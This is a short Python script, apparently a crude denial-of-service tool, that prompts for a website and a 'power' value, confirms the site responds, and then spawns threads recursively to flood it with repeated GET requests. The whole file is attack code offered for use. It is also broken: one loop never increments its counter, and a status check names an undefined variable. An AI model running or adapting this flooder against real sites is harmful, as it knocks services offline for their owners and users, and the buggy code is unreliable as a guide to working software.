import requests
import threading

x = input("Your website:\n");
y = float(input("Enter a power:\n"));

def dos():
 i = 0;
 while i <= 500 * y:
  threading.Thread(target=dos).start()
 while i <= 500 * y:
  requests.get(x);
  #print(i)
  i = i + 1;

def prov():
 response = requests.get(x);
 code = int(response.status_code);
 return code

prcd = prov();
if prcd == 200 or code == 204:
 print("True!")
 dos()
